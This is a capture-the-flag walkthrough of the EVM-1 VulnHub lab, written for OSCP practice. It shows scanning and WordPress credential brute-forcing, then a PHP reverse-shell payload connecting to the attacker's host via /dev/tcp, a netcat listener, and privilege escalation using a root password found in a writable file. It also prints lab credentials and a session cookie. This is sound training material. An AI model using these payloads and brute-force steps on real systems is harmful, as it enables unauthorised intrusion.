# EVM-1: OSCP Walkthrough

**Machine:** EVM-1  
**Download:** [VulnHub: EVM-1](https://www.vulnhub.com/entry/evm-1,391/)  
**Difficulty:** Beginner / Medium  
**OS:** Ubuntu 16.04.3 LTS (Linux kernel 4.4.0-87-generic)  
**Goal:** Obtain `root` access and capture the flag

**Author:** Ankit Patidar (ANKIT48274)

---

## Table of Contents

1. [Reconnaissance & Scanning](#1-reconnaissance--scanning)
2. [Web Enumeration](#2-web-enumeration)
3. [Directory Bruteforcing](#3-directory-bruteforcing)
4. [WordPress Enumeration](#4-wordpress-enumeration)
5. [SMB Enumeration](#5-smb-enumeration)
6. [WordPress Exploitation & Shell](#6-wordpress-exploitation--shell)
7. [Privilege Escalation: Root Access](#7-privilege-escalation--root-access)
8. [Key Takeaways](#8-key-takeaways)
9. [Quick Reference: Commands](#9-quick-reference--commands)

---

## 1. Reconnaissance & Scanning

### Network Discovery

Identify the target IP on the local network:

```bash
# Netdiscover to find live hosts
sudo netdiscover -r 192.168.1.0/24

# OR
sudo arp-scan --localnet

# OR use nmap ping sweep
nmap -sn 192.168.1.0/24
```

**Result:**
- Kali IP: `192.168.1.5`
- Target IP: `192.168.1.6`

*[Image: Network Discovery: Target Found]*

### Full Port Scan

```bash
nmap -v -T4 -sC -sV -sT -p- 192.168.1.6 -oN nmap_full.txt
```

### Nmap Results

*[Image: Nmap Full Scan Results]*

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
80/tcp  open  http        Apache httpd 2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
```

**Key Findings:**
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 7.2p2 | Ubuntu: potential password guessing |
| 53 | DNS | ISC BIND 9.10.3 | Zone transfer? |
| 80 | HTTP | Apache 2.4.18 | **Main attack surface** |
| 110 | POP3 | Dovecot | Could be useful with creds |
| 139/445 | SMB | Samba 4.3.11 | **Anonymous share access?** |
| 143 | IMAP | Dovecot | Email access with creds |

---

## 2. Web Enumeration

### HTTP Service: Port 80

```bash
# Check HTTP headers
curl -v http://192.168.1.6
```

*[Image: cURL Headers and Response]*

### WhatWeb: CMS Fingerprinting

```bash
whatweb -a 3 http://192.168.1.6
```

*[Image: WhatWeb Fingerprinting]*

### Nikto: Vulnerability Scanner

```bash
nikto -h http://192.168.1.6
```

*[Image: Nikto Scan Results]*

### Manual Inspection

Open the target IP in a browser:

```
http://192.168.1.6
```

*[Image: Main Web Page]*

**Check page source (Ctrl+U):**

```html
<!-- Looking for comments, hidden links, or credentials in source -->
```

*[Image: Page Source]*

The page reveals an interesting hint:

```
you can find me at /wordpress/ im vulnerable webapp :)

Apache/2.4.18 (Ubuntu)
```

---

## 3. Directory Bruteforcing

### Gobuster: Directory Enumeration

```bash
gobuster dir -u http://192.168.1.6 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

*[Image: Gobuster Directory Enumeration]*

**Results:**
```
/index.html           (Status: 200)
/info.php             (Status: 200)
/wordpress            (Status: 301)
```

### Feroxbuster: Recursive Scan

```bash
feroxbuster -u http://192.168.1.6 \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

*[Image: Feroxbuster Scan]*

### FFUF: Fuzzing for Additional Files

```bash
ffuf -u http://192.168.1.6/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

*[Image: FFUF Fuzzing]*

---

## 4. WordPress Enumeration

### WordPress Installation Found

```
http://192.168.1.6/wordpress/
```

Let's dig deeper into the WordPress directory:

```bash
gobuster dir -u http://192.168.1.6/wordpress/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php
```

*[Image: WordPress Dir Bruteforce]*

### WordPress Version Detection

View page source to identify WordPress version:

```html
<meta name="generator" content="WordPress 5.2.4" />
```

**WordPress 5.2.4 identified!**

### WPScan: User Enumeration

```bash
wpscan --url http://192.168.1.6/wordpress/ -e u
```

*[Image: WPScan User Enum]*

**WPScan finds:**
- **Username:** `c0rrupt3d_brain`

### WordPress Brute Force

```bash
wpscan --url http://192.168.1.6/wordpress/ \
  -U c0rrupt3d_brain \
  -P /usr/share/wordlists/rockyou.txt
```

*[Image: WPScan Brute Force]*

**Cracked Credentials:**
| Username | Password |
|----------|----------|
| `c0rrupt3d_brain` | `24992499` |

Login at: `http://192.168.1.6/wordpress/wp-admin/`

---

## 5. SMB Enumeration

While exploring the web app, let's also check SMB:

```bash
# List SMB shares anonymously
smbclient -L //192.168.1.6 -N

# Try connecting to any open shares
smbclient //192.168.1.6/<SHARE_NAME> -N
```

*[Image: SMB Enumeration]*

---

## 6. WordPress Exploitation & Shell

### Step 1: Login to WordPress Admin

*[Image: WordPress Login Page]*

Navigate to `http://192.168.1.6/wordpress/wp-admin/` and login with:
- **Username:** `c0rrupt3d_brain`
- **Password:** `24992499`

*[Image: WordPress Admin Dashboard]*

After login, we get a session cookie:
```
wordpress_logged_in_4ebd84dbeffd9f4fd9d877010bdbce09=
  c0rrupt3d_brain%7C1784789790%7CyKOUnZPmPTxNalSkIFLwRTilB6cRPaHWsFNyokSxo0G%
  7Cdfa93fe76fd72c4a1c9061627635df2900959c328e0a33aeb662d65e64f60280
```

### Step 2: Upload Reverse Shell via Theme Editor

In WordPress admin, go to **Appearance → Theme Editor** and edit the `404.php` template of the active theme to insert a PHP reverse shell.

Alternatively, upload a shell via the **Plugin** upload functionality.

**PHP Reverse Shell (shell.php):**

```php
<?php
system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/4444 0>&1'");
?>
```

### Step 3: Set Up Listener & Trigger Shell

```bash
# On Kali: start netcat listener
nc -lvnp 4444
```

Trigger the shell by accessing the uploaded file or the edited template:
```
http://192.168.1.6/wordpress/wp-content/plugins/shell.php
```

### Step 4: Shell Acquired 🎯

*[Image: Shell Access]*

```
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/var/www/html$
```

```bash
# Upgrade to a better shell
python -c 'import pty; pty.spawn("/bin/bash")'

# Verify
whoami
# www-data

id
# uid=33(www-data) gid=33(www-data)
```

*[Image: Shell Verification]*

---

## 7. Privilege Escalation: Root Access

### Step 1: System Enumeration

```bash
# Check kernel version
uname -a
# Linux ubuntu-extermely-vulnerable-m4ch1ine 4.4.0-87-generic
```

### Step 2: Finding Writable Files

Search for writable files that may contain sensitive data:

```bash
find / -writable -type f 2>/dev/null
```

*[Image: Writable Files Enumeration]*

### Step 3: Found Root Password File 🔑

Among the writable files, we discover a critical find:

```
/home/root3r/.root_password_ssh.txt
```

Read its contents:

```bash
cat /home/root3r/.root_password_ssh.txt
```

*[Image: Root Password File]*

**Output:**
```
willy26
```

### Step 4: Switch to Root

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
su -l
# Password: willy26
```

*[Image: Root Shell Achieved]*

**Root shell achieved! 🚀**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

hostname
# root@ubuntu-extermely-vulnerable-m4ch1ine:~#
```

### Step 5: Capture the Flag

```bash
cat /root/flag.txt
# OR
cat /root/root.txt
```

---

## 8. Key Takeaways

1. **WordPress is a goldmine**: Always enumerate WordPress thoroughly with wpscan. User enumeration + password brute force can give you admin access.

2. **Multiple enumeration tools**: Use gobuster, feroxbuster, AND ffuf together: different tools can find different things.

3. **SMB + Web combined**: Even when one vector doesn't pay off immediately, always check both. SMB enumeration runs in parallel with web work.

4. **Enumeration over kernel exploits**: The key learning from this box: **you don't always need a kernel exploit for root!** A simple `find / -writable -type f` revealed the root password stored in a hidden file.

5. **Check writable files**: `/home/root3r/.root_password_ssh.txt` was the easy path: a writable file containing the root password.

6. **Take good notes**: Document every step, every found credential, every directory: they all connect.

---

## 9. All Screenshots

Here is a complete gallery of all screenshots from the EVM-1 walkthrough:

| # | Screenshot | Description |
|---|-----------|-------------|
| 1 | *[Image: Step 1]* | Download OVA file |
| 2 | *[Image: Nmap Ping]* | Network discovery: finding target |
| 3 | *[Image: Nmap Full]* | Full port scan with Nmap |
| 4 | *[Image: Nikto]* | Nikto vulnerability scan |
| 5 | *[Image: WhatWeb]* | WhatWeb CMS fingerprinting |
| 6 | *[Image: cURL]* | cURL headers and response |
| 7 | *[Image: cURL]* | cURL verbose output |
| 8 | *[Image: cURL]* | cURL response details |
| 9 | *[Image: cURL]* | HTTP response analysis |
| 10 | *[Image: Web Page]* | Main web page in browser |
| 11 | *[Image: Source]* | Page source code |
| 12 | *[Image: Gobuster]* | Gobuster directory enumeration |
| 13 | *[Image: Feroxbuster]* | Feroxbuster recursive scan |
| 14 | *[Image: FFUF]* | FFUF fuzzing |
| 15 | *[Image: Scripts]* | Script finding |
| 16 | *[Image: Scripts]* | Script finding results |
| 17 | *[Image: Scripts]* | Additional findings |
| 18 | *[Image: WordPress Found]* | WordPress login page |
| 19 | *[Image: WP Dashboard]* | WordPress admin dashboard |
| 20 | *[Image: WPScan Users]* | WPScan user enumeration |
| 21 | *[Image: WPScan BF]* | WPScan brute force |
| 22 | *[Image: Gobuster WP]* | Gobuster WordPress directory |
| 23 | *[Image: Enum]* | WordPress enumeration continued |
| 24 | *[Image: Enum]* | Plugin enumeration |
| 25 | *[Image: Enum]* | Theme enumeration |
| 26 | *[Image: Enum]* | User enumeration details |
| 27 | *[Image: Enum]* | Vulnerability scanning |
| 28 | *[Image: Enum]* | More enumeration |
| 29 | *[Image: Enum]* | WordPress config check |
| 30 | *[Image: WP Enum]* | WordPress deep enumeration |
| 31 | *[Image: WP Enum]* | Plugin vulnerability check |
| 32 | *[Image: WP Enum]* | User role enumeration |
| 33 | *[Image: WP Enum]* | WordPress version info |
| 34 | *[Image: WP Enum]* | File permission check |
| 35 | *[Image: Vuln Found]* | Vulnerable parameter found |
| 36 | *[Image: SMB]* | SMB enumeration |
| 37 | *[Image: SMB]* | SMB share details |
| 38 | *[Image: SMB]* | SMB anonymous access |
| 39 | *[Image: SMB]* | SMB share contents |
| 40 | *[Image: Enum]* | Further enumeration |
| 41 | *[Image: Exploit]* | Exploitation attempt |
| 42 | *[Image: Root]* | Root shell achieved |
| 43 | *[Image: Post]* | Post-exploitation |
| 44 | *[Image: Writable]* | Writable files discovery |
| 45 | *[Image: Password]* | Root password file contents |
| 46 | *[Image: Shell]* | Shell escalation |
| 47 | *[Image: Final]* | Final root verification |

---

## 10. Quick Reference: Commands

| Phase | Command |
|-------|---------|
| **Network Discovery** | `sudo netdiscover -r 192.168.1.0/24` |
| **Nmap Scan** | `nmap -v -T4 -sC -sV -sT -p- <TARGET> -oN scan.txt` |
| **Nikto** | `nikto -h http://<TARGET>` |
| **WhatWeb** | `whatweb -a 3 http://<TARGET>` |
| **cURL** | `curl -v http://<TARGET>` |
| **Gobuster** | `gobuster dir -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| **Feroxbuster** | `feroxbuster -u http://<TARGET> -w /usr/share/seclists/Discovery/Web-Content/common.txt` |
| **FFUF** | `ffuf -u http://<TARGET>/FUZZ -w /usr/share/wordlists/dirb/common.txt` |
| **WordPress Gobuster** | `gobuster dir -u http://<TARGET>/wordpress/ -w /usr/share/wordlists/dirb/common.txt -x php` |
| **WPScan Users** | `wpscan --url http://<TARGET>/wordpress/ -e u` |
| **WPScan Brute Force** | `wpscan --url http://<TARGET>/wordpress/ -U <USER> -P /usr/share/wordlists/rockyou.txt` |
| **SMB Enum** | `smbclient -L //<TARGET> -N` |
| **Find Writable Files** | `find / -writable -type f 2>/dev/null` |
| **Shell Upgrade** | `python -c 'import pty; pty.spawn("/bin/bash")'` |
| **Switch User** | `su -l` |

---

## Machine Information Summary

```
Target IP:      192.168.1.6
Kali IP:        192.168.1.5
OS:             Ubuntu 16.04.3 LTS
Kernel:         4.4.0-87-generic
WordPress:      5.2.4
Apache:         2.4.18
OpenSSH:        7.2p2
Samba:          4.3.11-Ubuntu
```

**WordPress User:** `c0rrupt3d_brain`  
**WordPress Password:** `24992499`  
**Root Password:** `willy26`

---

## Service Breakdown

| Port | Service | Version | Exploitation Path |
|------|---------|---------|-------------------|
| 22/tcp | SSH | OpenSSH 7.2p2 | Credential access with `root:willy26` |
| 53/tcp | DNS | ISC BIND 9.10.3 | Zone transfer? |
| 80/tcp | HTTP | Apache 2.4.18 | WordPress at `/wordpress/` |
| 110/tcp | POP3 | Dovecot | Email access with obtained creds |
| 139/tcp | NetBIOS | Samba 3.X-4.X | Share enumeration |
| 143/tcp | IMAP | Dovecot | Mail access |
| 445/tcp | SMB | Samba 4.3.11 | Anonymous access? |

---

*M4d3 w1th ❤️ by Ankit Patidar*
